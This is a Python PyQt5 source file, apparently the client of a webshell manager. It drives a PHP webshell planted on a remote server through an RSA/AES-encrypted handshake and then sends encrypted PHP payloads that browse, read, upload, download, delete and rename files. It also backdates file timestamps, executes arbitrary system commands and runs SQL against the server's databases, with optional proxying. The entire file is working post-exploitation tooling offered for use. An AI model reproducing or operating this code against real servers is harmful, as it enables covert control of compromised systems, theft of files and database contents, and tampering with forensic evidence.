from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Hash import MD5
from PyQt5.QtCore import QObject, pyqtSignal, QUrl, QByteArray, QFile, QIODevice, QFileInfo
from PyQt5.QtNetwork import QNetworkAccessManager, QNetworkProxy, QNetworkRequest, QNetworkReply
import base64
import json


class WebshellService(QObject):
    signalSessionClosed = pyqtSignal(int)
    signalShackHandResult = pyqtSignal(dict)
    signalGetBaseInfoResult = pyqtSignal(dict)
    signalListDirectoryResult = pyqtSignal(dict)
    signalReadFileResult = pyqtSignal(dict)
    signalUpdateFileResult = pyqtSignal(dict)
    signalDetectPathResult = pyqtSignal(dict)
    signalNewFileResult = pyqtSignal(dict)
    signalNewDirResult = pyqtSignal(dict)
    signalDeleteFilesResult = pyqtSignal(dict)
    signalModifyFileTimeResult = pyqtSignal(dict)
    signalRenameFileResult = pyqtSignal(dict)
    signalDownloadFinished = pyqtSignal()
    signalDownloadUpdateProgress = pyqtSignal(dict)
    signalDownloadError = pyqtSignal(str)
    signalUploadError = pyqtSignal(str)
    signalUploadUpdateProgress = pyqtSignal(dict)
    signalUploadFileFinished = pyqtSignal(dict)
    signalExecuteCmdResult = pyqtSignal(dict)
    signalConnectDatabaseResult = pyqtSignal(dict)
    signalShowTablesResult = pyqtSignal(dict)
    signalSelectTableAttrResult = pyqtSignal(dict)
    signalSelectTabledataResult = pyqtSignal(dict)
    signalExecuteSQLResult = pyqtSignal(dict)

    def __init__(self, webshellObj, proxyObj=None):
        super(WebshellService, self).__init__()
        self.nam = QNetworkAccessManager(self)
        self.webshell = webshellObj
        self.proxy = proxyObj
        self.os = None
        self.key = None
        self.aesKey = None

        self.downloader = None
        self.downloadSaveFile = None
        self.downloadCancelFlag = False

        self.uploadLocalFile = None
        self.uploadCancelFlag = False
        self.uploadSendSize = 0
        self.uploadFilePath = None

        self.executeCmder = None
        self.executeCancelFlag = False

    def shackHand(self):
        self.key = RSA.generate(1024, Random.new().read)
        publicKey = self.key.public_key().exportKey()
        passwd = MD5.new(self.webshell.passwd.encode()).hexdigest()
        with open("./Core/payload/shackHand.php", "rb") as f:
            payload = f.read()
        data = {
            "code": base64.b64encode(payload).decode(),
            "pbk": publicKey.decode()
        }
        data = self.AESEncrypt(passwd, json.dumps(data))

        self.nam.finished.connect(self.shackHandResult)
        self.doPOST(data)

    def shackHandResult(self, reply):
        result = {
            "status": True,
            "message": ""
        }
        if reply.error() == QNetworkReply.NoError:
            responseBytes = reply.readAll()
            try:
                response = self.RSADecrypt(base64.b64decode(responseBytes))
                data = json.loads(response)
                self.aesKey = data["key"]
                self.os = data["os"]
            except Exception as e:
                result["status"] = False
                result["message"] = str(e)
        else:
            result["status"] = False
            result["message"] = reply.errorString()
        self.nam.finished.disconnect(self.shackHandResult)
        self.signalShackHandResult.emit(result)

    def closeSession(self):
        if not self.os:
            return self.signalSessionClosed.emit(self.webshell.id)
        with open("./Core/payload/closeSession.php".format(self.os), "rb") as f:
            payload = f.read()
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(lambda: self.signalSessionClosed.emit(self.webshell.id))
        self.doPOST(data, timeout=1000)

    def getBaseInfo(self):
        if not self.os:
            return
        with open("./Core/payload/{}/getBaseInfo.php".format(self.os), "rb") as f:
            payload = f.read()
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.getBaseInfoResult)
        self.doPOST(data)

    def getBaseInfoResult(self, reply):
        result = self.parseReply(reply)
        self.nam.finished.disconnect(self.getBaseInfoResult)
        self.signalGetBaseInfoResult.emit(result)

    def listDirectory(self, directory):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/list.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__DIR__", base64.b64encode(directory.encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.listDirectoryResult)
        self.doPOST(data)

    def listDirectoryResult(self, reply):
        result = self.parseReply(reply)

        self.nam.finished.disconnect(self.listDirectoryResult)
        self.signalListDirectoryResult.emit(result)

    def readFile(self, path):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/read.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__FILE__", base64.b64encode(path.encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.readFileResult)
        self.doPOST(data)

    def readFileResult(self, reply):
        result = self.parseReply(reply)

        self.nam.finished.disconnect(self.readFileResult)
        self.signalReadFileResult.emit(result)

    def updateFile(self, fileInfo):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/save.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__FILE__", base64.b64encode(fileInfo["path"].encode()))
            payload = payload.replace(b"__CONTENTS__", base64.b64encode(fileInfo["contents"].encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.updateFileResult)
        self.doPOST(data)

    def updateFileResult(self, reply):
        result = self.parseReply(reply)

        self.nam.finished.disconnect(self.updateFileResult)
        self.signalUpdateFileResult.emit(result)

    def detectPath(self, path):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/detectPath.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__PATH__", base64.b64encode(path.encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.detectPathResult)
        self.doPOST(data)

    def detectPathResult(self, reply):
        result = self.parseReply(reply)

        self.nam.finished.disconnect(self.detectPathResult)
        self.signalDetectPathResult.emit(result)

    def newFile(self, path):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/save.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__FILE__", base64.b64encode(path.encode()))
            payload = payload.replace(b'__CONTENTS__', b'')
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.newFileResult)
        self.doPOST(data)

    def newFileResult(self, reply):
        result = self.parseReply(reply)

        self.nam.finished.disconnect(self.newFileResult)
        self.signalNewFileResult.emit(result)

    def newDir(self, path):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/createDir.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__PATH__", base64.b64encode(path.encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.newDirResult)
        self.doPOST(data)

    def newDirResult(self, reply):
        result = self.parseReply(reply)

        self.nam.finished.disconnect(self.newDirResult)
        self.signalNewDirResult.emit(result)

    def deleteFiles(self, files):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/delete.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__FILES__", base64.b64encode(json.dumps(files).encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.deleteFilesResult)
        self.doPOST(data)

    def deleteFilesResult(self, reply):
        result = self.parseReply(reply)

        self.nam.finished.disconnect(self.deleteFilesResult)
        self.signalDeleteFilesResult.emit(result)

    def modifyFileTime(self, info):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/modifyTime.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__TIME__", info["time"].encode())
            payload = payload.replace(b'__FILE__', base64.b64encode(info["file"].encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.modifyFileTimeResult)
        self.doPOST(data)

    def modifyFileTimeResult(self, reply):
        result = self.parseReply(reply)

        self.nam.finished.disconnect(self.modifyFileTimeResult)
        self.signalModifyFileTimeResult.emit(result)

    def renameFile(self, file):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/rename.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__OLD__", base64.b64encode(file["oldName"].encode()))
            payload = payload.replace(b'__NEW__', base64.b64encode(file["newName"].encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.nam.finished.connect(self.renameFileResult)
        self.doPOST(data)

    def renameFileResult(self, reply):
        result = self.parseReply(reply)

        self.nam.finished.disconnect(self.renameFileResult)
        self.signalRenameFileResult.emit(result)

    def downloadFile(self, parm):
        if not self.os:
            return
        with open("./Core/payload/{}/fileManage/download.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__FILE__", base64.b64encode(parm["downloadFile"].encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))

        savePath = parm["saveFile"]
        if QFile.exists(savePath):
            QFile.remove(savePath)
        self.downloadSaveFile = QFile(savePath)
        if not self.downloadSaveFile.open(QIODevice.WriteOnly):
            self.downloadSaveFile = None
            self.signalDownloadError.emit("保存文件失败")
            return
        self.downloadCancelFlag = False

        self.downloader = self.doPOST(data)
        self.downloader.finished.connect(self.downloadFileFinished)
        self.downloader.readyRead.connect(self.downloadFileReadyRead)
        self.downloader.downloadProgress.connect(self.downloadFileUpdateProgress)

    def downloadFileFinished(self):
        if self.downloadCancelFlag:
            if self.downloadSaveFile:
                self.downloadSaveFile.close()
                self.downloadSaveFile.remove()
        else:
            self.downloadSaveFile.flush()
            self.downloadSaveFile.close()
            self.signalDownloadFinished.emit()

        self.downloadSaveFile = None
        self.downloader.deleteLater()
        self.downloader = None

    def downloadFileReadyRead(self):
        if not self.downloadCancelFlag and self.downloadSaveFile and self.downloader:
            if self.downloader.error() == QNetworkReply.NoError and self.downloader.hasRawHeader("ETag".encode()):
                etag = self.downloader.rawHeader("ETag".encode()).data().decode()[1:-1]   # 去除双引号""
                etag = self.AESDecrypt(self.aesKey, etag)
                status = int(etag[0])
                if status:
                    self.downloadSaveFile.write(self.downloader.readAll())
                else:
                    self.downloadCancel()
                    self.signalDownloadError.emit("下载权限不足")
            else:
                self.downloadCancel()
                self.signalDownloadError.emit("下载失败")

    def downloadFileUpdateProgress(self, bytesRead, totalBytes):
        if not self.downloadCancelFlag and self.downloader:
            if self.downloader.hasRawHeader("ETag".encode()):
                etag = self.downloader.rawHeader("ETag".encode()).data().decode()[1:-1]  # 去除双引号""
                etag = self.AESDecrypt(self.aesKey, etag)
                status = int(etag[0])
                if status:
                    maxSize = int(etag[1:])
                    nowSize = int(bytesRead/1024)
                    self.signalDownloadUpdateProgress.emit({"maxSize": maxSize, "nowSize": nowSize})
                else:
                    self.downloadCancel()
                    self.signalDownloadError.emit("下载权限不足")
            else:
                self.downloadCancel()
                self.signalDownloadError.emit("下载失败")

    def downloadCancel(self):
        self.downloadCancelFlag = True
        if self.downloader:
            self.downloader.abort()

    def uploadFile(self, parm):
        if not self.os:
            return
        self.uploadLocalFile = QFile(parm["uploadFile"])
        self.uploadCancelFlag = False
        if not self.uploadLocalFile.open(QIODevice.ReadOnly):
            self.uploadLocalFile = None
            self.uploadCancelFlag = True
            return self.signalUploadError.emit("打开文件失败")
        self.uploadFilePath = parm["uploadDir"] + QFileInfo(self.uploadLocalFile).fileName()
        self.nam.finished.connect(self.uploadFileResult)
        self.uploadFileWrite()

    def uploadFileWrite(self):
        if self.uploadCancelFlag:
            return
        with open("./Core/payload/{}/fileManage/upload.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__FILE__", base64.b64encode(self.uploadFilePath.encode()))
            payload = payload.replace(b'__CONTENTS__', base64.b64encode(self.uploadLocalFile.read(4096)))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.doPOST(data)

    def uploadFileCancel(self):
        self.uploadCancelFlag = True
        self.uploadSendSize = 0
        if self.uploadLocalFile:
            self.uploadLocalFile.close()
            self.uploadLocalFile = None
        try:
            self.nam.finished.disconnect(self.uploadFileResult)
        except TypeError:
            pass

    def uploadFileResult(self, reply):
        if self.uploadCancelFlag:
            return
        result = self.parseReply(reply)
        print(result)
        if result["status"]:
            data = result["data"]
            if data["status"]:
                self.uploadSendSize += data["length"]
                maxSize = int(self.uploadLocalFile.size()/1024)
                nowSize = int(self.uploadSendSize/1024)
                self.signalUploadUpdateProgress.emit({"maxSize": maxSize, "nowSize": nowSize})
                if self.uploadSendSize >= self.uploadLocalFile.size():
                    self.uploadFileCancel()
                    self.signalUploadFileFinished.emit(result)
                else:
                    self.uploadFileWrite()
            else:
                self.uploadFileCancel()
                self.signalUploadError.emit("权限不足")
        else:
            self.uploadFileCancel()
            self.signalUploadError.emit("上传失败")

    def executeCmd(self, parm):
        if not self.os:
            return
        with open("./Core/payload/{}/cmd.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__CMD__", base64.b64encode(parm["cmd"].encode()))
            payload = payload.replace(b"__PATH__", base64.b64encode(parm["path"].encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        self.executeCancelFlag = False
        self.executeCmder = self.doPOST(data)
        self.executeCmder.finished.connect(self.executeCmdResult)

    def executeCmdResult(self):
        if not self.executeCancelFlag:
            result = self.parseReply(self.executeCmder)
            self.signalExecuteCmdResult.emit(result)
        self.executeCmder.deleteLater()
        self.executeCmder = None

    def executeCmdCancel(self):
        self.executeCancelFlag = True
        if self.executeCmder:
            self.executeCmder.abort()

    def connectDatabase(self, parm):
        if not self.os:
            return
        parm["sql"] = "show databases;"
        parm["current"] = ""
        self.nam.finished.connect(self.connectDatabaseResult)
        self.databaseExecuteSql(parm)

    def connectDatabaseResult(self, reply):
        result = self.parseReply(reply)
        self.nam.finished.disconnect(self.connectDatabaseResult)
        self.signalConnectDatabaseResult.emit(result)

    def showTables(self, parm):
        if not self.os:
            return
        parm["sql"] = "show tables from {};".format(parm["current"])
        self.nam.finished.connect(self.showTablesResult)
        self.databaseExecuteSql(parm)

    def showTablesResult(self, reply):
        result = self.parseReply(reply)
        self.nam.finished.disconnect(self.showTablesResult)
        self.signalShowTablesResult.emit(result)

    def selectTableAttr(self, parm):
        if not self.os:
            return
        parm["sql"] = "show columns from {};".format(parm["current"])
        self.nam.finished.connect(self.selectTableAttrResult)
        self.databaseExecuteSql(parm)

    def selectTableAttrResult(self, reply):
        result = self.parseReply(reply)
        self.nam.finished.disconnect(self.selectTableAttrResult)
        self.signalSelectTableAttrResult.emit(result)

    def selectTableData(self, parm):
        if not self.os:
            return
        parm["sql"] = "select * from {};".format(parm["current"])
        self.nam.finished.connect(self.selectTableDataResult)
        self.databaseExecuteSql(parm)

    def selectTableDataResult(self, reply):
        result = self.parseReply(reply)
        self.nam.finished.disconnect(self.selectTableDataResult)
        self.signalSelectTabledataResult.emit(result)

    def executeSQL(self, parm):
        if not self.os:
            return
        self.nam.finished.connect(self.executeSQLResult)
        self.databaseExecuteSql(parm)

    def executeSQLResult(self, reply):
        result = self.parseReply(reply)
        self.nam.finished.disconnect(self.executeSQLResult)
        self.signalExecuteSQLResult.emit(result)

    def databaseExecuteSql(self, parm):
        with open("./Core/payload/database.php".format(self.os), "rb") as f:
            payload = f.read().replace(b"__HOST__", base64.b64encode(parm["host"].encode()))
            payload = payload.replace(b"__PORT__", base64.b64encode(parm["port"].encode()))
            payload = payload.replace(b"__USER__", base64.b64encode(parm["user"].encode()))
            payload = payload.replace(b"__PASSWD__", base64.b64encode(parm["passwd"].encode()))
            payload = payload.replace(b"__DBS__", base64.b64encode(parm["database"].encode()))
            payload = payload.replace(b"__SQL__", base64.b64encode(parm["sql"].encode()))
            payload = payload.replace(b"__CURRENT__", base64.b64encode(parm["current"].encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        data = self.AESEncrypt(self.aesKey, json.dumps(data))
        return self.doPOST(data)

    def doPOST(self, data, timeout=3000):
        request = QNetworkRequest(QUrl(self.webshell.url))
        for header in json.loads(self.webshell.httpHeader):
            request.setRawHeader(QByteArray(header["name"].encode()), QByteArray(header["value"].encode()))
        if self.proxy and self.proxy.id:
            proxy = QNetworkProxy()
            proxy.setType(QNetworkProxy.HttpProxy if self.proxy.protocol == "http" else QNetworkProxy.Socks5Proxy)
            proxy.setHostName(self.proxy.server)
            proxy.setPort(int(self.proxy.port))
            proxy.setUser(self.proxy.user)
            proxy.setPassword(self.proxy.passwd)
            self.nam.setProxy(proxy)
        request.setHeader(QNetworkRequest.ContentTypeHeader, "application/x-www-form-urlencoded")
        self.nam.setTransferTimeout(timeout)
        return self.nam.post(request, QByteArray(data.encode()))

    def parseReply(self, reply):
        result = {
            "status": True,
            "message": ""
        }
        if reply.error() == QNetworkReply.NoError:
            responseBytes = reply.readAll()
            try:
                response = self.AESDecrypt(self.aesKey, responseBytes.data().decode(errors="replace"))
                result["data"] = json.loads(base64.b64decode(response.encode()).decode(errors="replace"))
            except Exception as e:
                result["status"] = False
                result["message"] = str(e)
        else:
            result["status"] = False
            result["message"] = reply.errorString()
        return result

    '''key: str, data:str, return: str base64'''
    @staticmethod
    def AESEncrypt(key, data):
        pad = lambda s: s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
        cipher = AES.new(key.encode(), AES.MODE_ECB)
        dataEncrypt = cipher.encrypt(pad(data).encode())
        return base64.b64encode(dataEncrypt).decode(errors="replace")

    '''key: str, data: str base64, return str'''
    @staticmethod
    def AESDecrypt(key, data):
        unpad = lambda s: s[:-ord(s[len(s) - 1:])]
        cipher = AES.new(key.encode(), AES.MODE_ECB)
        data = base64.b64decode(data.encode())
        return unpad(cipher.decrypt(data).decode(errors="replace"))

    '''data: byte, return: str '''
    def RSADecrypt(self, data):
        privateKey = self.key.exportKey()
        cipher = PKCS1_OAEP.new(RSA.importKey(privateKey))
        return cipher.decrypt(data).decode(errors="replace")
